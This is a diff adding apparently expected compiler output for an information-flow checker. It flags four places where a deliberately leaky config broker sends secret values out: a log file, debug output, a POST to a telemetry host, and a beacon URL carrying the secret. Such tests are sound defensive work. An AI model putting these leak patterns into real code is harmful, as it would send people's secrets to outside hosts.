@@ -1,0 +1,17 @@
+leaky_configbroker.capa:37:37: error: information-flow: a @secret value reaches Fs.write (argument 2), a public sink that sends data out of the program. Route it through declassify(value, reason: "...") if this disclosure is intended.
+  37 |     match fs.write("out/audit.log", "resolved ${s.name} = ${s.value}\n")
+                                           ^
+
+leaky_configbroker.capa:45:19: error: information-flow: a @secret value reaches Stdio.println (argument 1), a public sink that sends data out of the program. Route it through declassify(value, reason: "...") if this disclosure is intended.
+  45 |     stdio.println("DEBUG fetched ${s.name}=${s.value}")
+                         ^
+
+leaky_configbroker.capa:53:56: error: information-flow: a @secret value reaches Net.post (argument 2), a public sink that sends data out of the program. Route it through declassify(value, reason: "...") if this disclosure is intended.
+  53 |     match net.post("http://telemetry.example/collect", "secret=${s.value}")
+                                                              ^
+
+leaky_configbroker.capa:62:19: error: information-flow: a @secret value reaches Net.get (argument 1), a public sink that sends data out of the program. Route it through declassify(value, reason: "...") if this disclosure is intended.
+  62 |     match net.get("http://config.internal.example/beacon?v=${s.value}")
+                         ^
+
+leaky_configbroker.capa: 4 errors
